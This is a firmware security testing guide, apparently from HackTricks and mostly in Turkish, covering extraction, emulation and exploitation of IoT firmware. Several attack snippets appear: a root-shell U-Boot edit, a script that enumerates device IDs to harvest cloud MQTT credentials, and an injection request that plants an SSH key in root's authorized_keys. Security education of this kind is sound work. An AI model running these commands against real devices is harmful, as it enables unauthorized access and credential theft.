# Firmware Analizi

{{#include ../../banners/hacktricks-training.md}}

## **Giriş**

### İlgili kaynaklar


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware, cihazların donanım bileşenleri ile kullanıcıların etkileştiği yazılım arasındaki iletişimi yönetip kolaylaştırarak cihazların doğru şekilde çalışmasını sağlayan temel bir yazılımdır. Kalıcı bellekte depolanır, böylece cihaz güç açıldığında hayati talimatlara erişebilir ve işletim sisteminin başlatılmasını sağlar. Firmware'in incelenmesi ve potansiyel olarak değiştirilmesi, güvenlik açıklarını belirlemede kritik bir adımdır.

## **Bilgi Toplama**

**Bilgi toplama**, bir cihazın yapısını ve kullandığı teknolojileri anlamadaki kritik ilk adımdır. Bu süreç şu verilerin toplanmasını içerir:

- CPU mimarisi ve çalıştırdığı işletim sistemi
- Bootloader spesifikasyonları
- Donanım düzeni ve datasheet'ler
- Kod tabanı metrikleri ve kaynak konumları
- Harici kütüphaneler ve lisans türleri
- Güncelleme geçmişleri ve düzenleyici sertifikalar
- Mimari ve akış diyagramları
- Güvenlik değerlendirmeleri ve tespit edilen zafiyetler

Bu amaç için, açık kaynak istihbaratı (OSINT) araçları çok değerlidir; ayrıca mevcut açık kaynak yazılım bileşenlerinin manuel ve otomatik incelemelerle analiz edilmesi önemlidir. [Coverity Scan](https://scan.coverity.com) ve [Semmle’s LGTM](https://lgtm.com/#explore) gibi araçlar, potansiyel sorunları bulmak için kullanılabilecek ücretsiz statik analiz sunar.

## **Firmware'i Elde Etme**

Firmware elde etme çeşitli yollarla yaklaşılabilir; her birinin farklı zorluk seviyeleri vardır:

- Kaynaktan doğrudan (geliştiriciler, üreticiler)
- Sağlanan talimatlardan derleyerek oluşturma
- Resmi destek sitelerinden indirme
- Barındırılan firmware dosyalarını bulmak için Google dork sorguları kullanma
- [S3Scanner](https://github.com/sa7mon/S3Scanner) gibi araçlarla cloud storage'a doğrudan erişim
- Man-in-the-middle teknikleriyle güncellemeleri yakalama
- UART, JTAG veya PICit gibi bağlantılar aracılığıyla cihazdan çıkarma
- Cihaz iletişiminde update isteklerini sniffing ile yakalama
- Hardcoded update endpoints belirleme ve kullanma
- Bootloader veya ağ üzerinden dumping
- Diğer tüm yöntemler başarısız olduğunda uygun donanım araçları kullanarak depolama çipini sökme ve okuma

### UART-only logs: force a root shell via U-Boot env in flash

If UART RX is ignored (logs only), you can still force an init shell by **editing the U-Boot environment blob** offline:

1. Dump SPI flash with a SOIC-8 clip + programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Locate the U-Boot env partition, edit `bootargs` to include `init=/bin/sh`, and **recompute the U-Boot env CRC32** for the blob.
3. Reflash only the env partition and reboot; a shell should appear on UART.

This is useful on embedded devices where the bootloader shell is disabled but the env partition is writable via external flash access.

## Firmware'i Analiz Etme

Artık firmware'e sahip olduğunuz için, nasıl ele alacağınızı bilmek amacıyla ondan bilgi çıkartmanız gerekir. Bunun için kullanabileceğiniz çeşitli araçlar:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Eğer bu araçlarla çok bir şey bulamazsanız, görüntünün **entropi**'sini `binwalk -E <bin>` ile kontrol edin; düşük entropi ise büyük olasılıkla şifrelenmemiştir. Yüksek entropi ise muhtemelen şifrelenmiştir (veya bir şekilde sıkıştırılmıştır).

Ayrıca, bu araçları firmware içine gömülü **dosyaları çıkarmak** için kullanabilirsiniz:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Veya dosyayı incelemek için [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) kullanabilirsiniz.

### Dosya Sistemini Elde Etme

With the previous commented tools like `binwalk -ev <bin>` you should have been able to **extract the filesystem**.\
Binwalk usually extracts it inside a **folder named as the filesystem type**, which usually is one of the following: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manuel Dosya Sistemi Çıkarma

Bazen binwalk, **dosya sisteminin magic byte'ını imzalarında bulamayabilir**. Bu durumlarda, binwalk'ı kullanarak **dosya sisteminin offset'ini bulun ve sıkıştırılmış dosya sistemini** binary'den carve edin ve aşağıdaki adımları kullanarak dosya sistemini türüne göre **manuel olarak çıkarın**.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Squashfs filesystem'ini carving yapan aşağıdaki **dd command**'ı çalıştırın.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternatif olarak, aşağıdaki komut da çalıştırılabilir.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs için (yukarıdaki örnekte kullanıldı)

`$ unsquashfs dir.squashfs`

Dosyalar daha sonra `squashfs-root` dizininde olacaktır.

- CPIO arşiv dosyaları

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 dosya sistemleri için

`$ jefferson rootfsfile.jffs2`

- NAND flash içeren ubifs dosya sistemleri için

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware Analizi

Firmware elde edildikten sonra, yapısını ve potansiyel güvenlik açıklarını anlamak için onu detaylı şekilde incelemek önemlidir. Bu süreç, firmware imajından değerli verileri analiz etmek ve çıkarmak için çeşitli araçların kullanılmasını içerir.

### İlk Analiz Araçları

İkili dosyanın (`<bin>` olarak anılacak) ilk incelemesi için bir dizi komut verilmiştir. Bu komutlar dosya türlerini belirlemeye, stringleri çıkarmaya, ikili veriyi analiz etmeye ve bölüm ile dosya sistemi detaylarını anlamaya yardımcı olur:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Görüntünün şifreleme durumunu değerlendirmek için **entropi** `binwalk -E <bin>` ile kontrol edilir. Düşük entropi şifrelemenin olmadığını, yüksek entropi ise muhtemel şifreleme veya sıkıştırmayı gösterir.

Gömülü dosyaları çıkarmak için **file-data-carving-recovery-tools** dokümantasyonu ve dosya incelemesi için **binvis.io** gibi araçlar ve kaynaklar önerilir.

### Dosya Sistemini Çıkarma

`binwalk -ev <bin>` kullanılarak genellikle dosya sistemi çıkarılabilir; çoğunlukla dosya sistemi türünün adına göre isimlendirilmiş bir dizine (ör. squashfs, ubifs) çıkarılır. Ancak, **binwalk** eksik magic baytları nedeniyle dosya sistemi türünü tanıyamadığında, manuel çıkarma gerekir. Bu, dosya sisteminin offset'ini bulmak için `binwalk` kullanmayı ve ardından `dd` komutuyla dosya sistemini ayıklamayı içerir:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Ardından, dosya sistemi türüne bağlı olarak (ör. squashfs, cpio, jffs2, ubifs), içeriği elle çıkarmak için farklı komutlar kullanılır.

### Dosya Sistemi Analizi

Dosya sistemi çıkarıldıktan sonra, güvenlik açıkları aranmaya başlanır. Güvensiz ağ daemon'ları, gömülü (hardcoded) kimlik bilgileri, API uç noktaları, update server işlevleri, derlenmemiş kod, startup script'leri ve çevrimdışı analiz için derlenmiş ikili dosyalar incelenir.

**İncelenecek önemli konumlar** ve **öğeler** şunlardır:

- **etc/shadow** ve **etc/passwd** — kullanıcı kimlik bilgileri için
- **etc/ssl** içindeki SSL sertifikaları ve anahtarlar
- Potansiyel zafiyetler için yapılandırma ve script dosyaları
- İleri analiz için gömülü ikili dosyalar
- Yaygın IoT cihaz web sunucuları ve ikili dosyalar

Dosya sistemi içindeki hassas bilgileri ve zayıflıkları ortaya çıkarmada birkaç araç yardımcı olur:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) ve [**Firmwalker**](https://github.com/craigz28/firmwalker) hassas bilgi aramaları için
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) kapsamlı firmware analizi için
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) ve [**EMBA**](https://github.com/e-m-b-a/emba) statik ve dinamik analiz için

### Derlenmiş İkili Dosyalarda Güvenlik Kontrolleri

Dosya sisteminde bulunan hem kaynak kodu hem de derlenmiş ikili dosyalar zafiyetler açısından dikkatle incelenmelidir. Unix ikili dosyaları için **checksec.sh** ve Windows ikili dosyaları için **PESecurity** gibi araçlar, sömürülebilecek korumasız ikili dosyaları tespit etmeye yardımcı olur.

## Türetilmiş URL token'ları yoluyla cloud config ve MQTT kimlik bilgilerinin toplanması

Birçok IoT hub'ı cihaz başına yapılandırmayı aşağıdaki gibi görünen bir cloud endpoint'inden alır:

- `https://<api-host>/pf/<deviceId>/<token>`

Firmware analizinde, `<token>`'ın device ID'den yerel olarak, gömülü bir secret kullanılarak türetildiğini bulabilirsiniz. Örneğin:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Bu tasarım, deviceId ve STATIC_KEY öğrenen herhangi bir kişinin URL'yi yeniden oluşturmasına ve cloud config'i çekmesine olanak sağlar; bu genellikle düz metin MQTT kimlik bilgilerini ve konu ön eklerini açığa çıkarır.

Pratik iş akışı:

1) UART boot loglarından deviceId'yi çıkarın

- 3.3V bir UART adaptörünü (TX/RX/GND) bağlayın ve logları kaydedin:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Bulut yapılandırma URL deseni ve broker adresini yazdıran satırları arayın, örneğin:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Firmware'den STATIC_KEY ve token algoritmasını kurtarın

- İkili dosyaları Ghidra/radare2'ye yükleyin ve konfigürasyon yolu ("/pf/") veya MD5 kullanımını arayın.
- Algoritmayı doğrulayın (ör. MD5(deviceId||STATIC_KEY)).
- Token'ı Bash'te türetin ve digest'i büyük harfe çevirin:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Cloud config ve MQTT credentials toplayın

- URL'i oluşturun ve curl ile JSON çekin; jq ile parse ederek secrets'leri çıkarın:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Plaintext MQTT ve zayıf topic ACLs'lerini kötüye kullanma (varsa)

- Recovered credentials kullanarak maintenance topic'larına subscribe olun ve hassas olayları arayın:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Tahmin edilebilir cihaz ID'lerini sıralayın (ölçekli, yetkilendirmeyle)

- Birçok ekosistem vendor OUI/product/type bytes'larını ardına gelen sıralı bir sonek ile gömüyor.
- Aday ID'leri yineleyebilir, tokens türetebilir ve configs'i programlı olarak çekebilirsiniz:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notlar
- mass enumeration denemeden önce her zaman açık yetki (explicit authorization) alın.
- Mümkünse hedef donanımı değiştirmeden gizli bilgileri geri kazanmak için emulation veya static analysis'i tercih edin.


Firmware'i emüle etme süreci, bir cihazın çalışmasının veya tek bir programın **dynamic analysis**'ine olanak tanır. Bu yaklaşım donanım veya mimari bağımlılıkları nedeniyle zorluklarla karşılaşabilir, ancak root filesystem'i veya belirli binaries'i, eşleşen architecture ve endianness'e sahip bir cihaza, örneğin Raspberry Pi'ye, veya önceden hazırlanmış bir virtual machine'e aktarmak, daha ileri testleri kolaylaştırabilir.

### Bireysel binaries'i emüle etme

Tek bir programı incelemek için programın endianness'ini ve CPU architecture'ını belirlemek çok önemlidir.

#### MIPS Architecture ile Örnek

MIPS Architecture binary'sini emüle etmek için şu komut kullanılabilir:
```bash
file ./squashfs-root/bin/busybox
```
Ve gerekli emülasyon araçlarını yüklemek için:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
For MIPS (big-endian), `qemu-mips` is used, and for little-endian binaries, `qemu-mipsel` would be the choice.

#### ARM Mimari Emülasyonu

For ARM binaries, the process is similar, with the `qemu-arm` emulator being utilized for emulation.

### Tam Sistem Emülasyonu

Tools like [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), and others, facilitate full firmware emulation, automating the process and aiding in dynamic analysis.

## Dinamik Analiz Uygulamada

Bu aşamada analiz için gerçek veya emüle edilmiş bir cihaz ortamı kullanılır. OS ve filesystem'e shell erişimini korumak esastır. Emülasyon donanım etkileşimlerini mükemmel şekilde taklit etmeyebilir; bu yüzden zaman zaman emülasyonun yeniden başlatılması gerekebilir. Analiz filesystem'e yeniden bakmalı, açığa çıkan webpages ve network servislerini exploit etmeli ve bootloader zafiyetlerini araştırmalıdır. Firmware bütünlüğü testleri potansiyel backdoor zafiyetlerini tespit etmek için kritiktir.

## Çalışma Zamanı Analiz Teknikleri

Çalışma zamanı analizi, bir süreç veya binary ile onun çalıştığı ortamda etkileşime girmeyi içerir; breakpoint koymak ve fuzzing gibi tekniklerle zafiyetleri tespit etmek için gdb-multiarch, Frida ve Ghidra gibi araçlar kullanılır.

For embedded targets without a full debugger, **cihaza statik bağlı bir `gdbserver` kopyalayın** ve uzaktan bağlayın:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
## Binary Exploitation and Proof-of-Concept

Belirlenen zaafiyetler için bir PoC geliştirmek, hedef mimarinin derinlemesine anlaşılmasını ve düşük seviyeli dillerde programlamayı gerektirir. Gömülü sistemlerde binary çalışma zamanı korumaları nadirdir; ancak mevcutsa Return Oriented Programming (ROP) gibi teknikler gerekli olabilir.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc, glibc'ye benzer fastbin'ler kullanır. Daha sonraki büyük bir tahsis `__malloc_consolidate()`'u tetikleyebilir; bu yüzden herhangi bir sahte chunk kontrollerden geçmelidir (mantıklı boyut, `fd = 0` ve çevresindeki chunk'ların "in use" olarak görünmesi).
- **Non-PIE binaries under ASLR:** ASLR etkin olsa bile ana binary **non-PIE** ise, ikili içindeki `.data/.bss` adresleri stabildir. Geçerli bir heap chunk header'ına zaten benzeyen bir bölgeyi hedefleyerek fastbin tahsisinin bir **function pointer table** üzerine düşmesini sağlayabilirsiniz.
- **Parser-stopping NUL:** JSON parse edilirken, payload içindeki bir `\x00` parsing'i durdurabilir ve takip eden saldırgan kontrollü baytları stack pivot/ROP zinciri için saklamaya devam edebilir.
- **Shellcode via `/proc/self/mem`:** `open("/proc/self/mem")`, `lseek()` ve `write()` çağıran bir ROP zinciri, bilinen bir mapping içine executable shellcode yerleştirip oraya atlayabilir.

## Prepared Operating Systems for Firmware Analysis

[AttifyOS](https://github.com/adi0x90/attifyos) ve [EmbedOS](https://github.com/scriptingxss/EmbedOS) gibi işletim sistemleri, gerekli araçlarla ön-yapılandırılmış firmware güvenlik testi ortamları sağlar.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS, Internet of Things (IoT) cihazlarının security assessment ve penetration testing'ini yapmanıza yardımcı olmak için tasarlanmış bir distro'dur. Gerekli tüm araçların yüklü olduğu ön-yapılandırılmış bir ortam sağlayarak size çok zaman kazandırır.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Ubuntu 18.04 tabanlı, firmware security testing araçlarıyla önceden yüklenmiş bir embedded security testing işletim sistemidir.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Bir satıcı firmware image'ları için kriptografik imza kontrolleri uygulasın, **version rollback (downgrade) koruması sıklıkla ihmal edilir**. Eğer boot- veya recovery-loader yalnızca gömülü bir public key ile imzayı doğruluyor ama flaşlanan imajın *version*'ını (veya monotonik bir sayacı) kıyaslamıyorsa, bir saldırgan meşru yollarla **hala geçerli imzaya sahip daha eski, zafiyetli bir firmware** yükleyebilir ve böylece yamalanmış zaafiyetleri tekrar sisteme sokabilir.

Tipik saldırı iş akışı:

1. **Eski imzalı bir image edinme**
   * Satıcının kamuya açık indirme portalından, CDN'den veya destek sitesinden alın.
   * Eşlik eden mobil/masaüstü uygulamalarından çıkarın (ör. bir Android APK içinde `assets/firmware/` altında).
   * VirusTotal, internet arşivleri, forumlar gibi üçüncü taraf depolarından alın.
2. **İmajı cihaza yükleyin veya servis edin** herhangi bir açık güncelleme kanalı üzerinden:
   * Web UI, mobile-app API, USB, TFTP, MQTT, vb.
   * Birçok tüketici IoT cihazı, Base64-encoded firmware blob'larını kabul eden ve sunucu tarafında decode edip recovery/upgrade tetikleyen *unauthenticated* HTTP(S) endpoint'leri açar.
3. Downgrade'den sonra, daha yeni sürümde yamalanmış bir zaafiyeti istismar edin (örneğin sonradan eklenmiş bir command-injection filtresi).
4. İsteğe bağlı olarak persistence sağlandıktan sonra tespit edilmemek için en son imajı geri yükleyin veya güncellemeleri devre dışı bırakın.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Zayıf (sürüm düşürülmüş) firmware'de, `md5` parametresi temizlenmeden doğrudan bir shell komutuna ekleniyor; bu da keyfi komut enjeksiyonuna izin veriyor (burada – SSH key-based root access etkinleştirme). Daha sonraki firmware sürümleri temel bir karakter filtresi getirdi, ancak sürüm düşürme korumasının olmaması bu düzeltmeyi etkisiz kılıyor.

### Mobil Uygulamalardan Firmware Çıkarma

Birçok üretici, uygulamanın cihazı Bluetooth/Wi‑Fi üzerinden güncelleyebilmesi için eşlik eden mobil uygulamalarının içine tam firmware görüntülerini dahil eder. Bu paketler genellikle APK/APEX içinde `assets/fw/` veya `res/raw/` gibi yollar altında şifrelenmemiş olarak depolanır. `apktool`, `ghidra` veya hatta sade `unzip` gibi araçlar, fiziksel donanıma dokunmadan imzalı görüntüleri çekmenizi sağlar.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Güncelleme Mantığını Değerlendirmek için Kontrol Listesi

* *update endpoint*'in taşıma/kimlik doğrulaması yeterince korunuyor mu (TLS + authentication)?
* Cihaz flashing işleminden önce **version numbers** veya **monotonic anti-rollback counter** karşılaştırıyor mu?
* İmaj secure boot chain içinde doğrulanıyor mu (örn. imzalar ROM code tarafından kontrol ediliyor mu)?
* Userland code ek tutarlılık kontrolleri yapıyor mu (örn. allowed partition map, model number)?
* *partial* veya *backup* update akışları aynı doğrulama mantığını tekrar kullanıyor mu?

> 💡  Eğer yukarıdakilerden herhangi biri eksikse, platform muhtemelen rollback attacks'e karşı savunmasızdır.

## Pratik için zafiyetli firmwareler

Firmware'de zafiyet keşfetme pratiği yapmak için aşağıdaki zafiyetli firmware projelerini başlangıç noktası olarak kullanın.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Eğitim ve Sertifika

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## Kaynaklar

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)

{{#include ../../banners/hacktricks-training.md}}
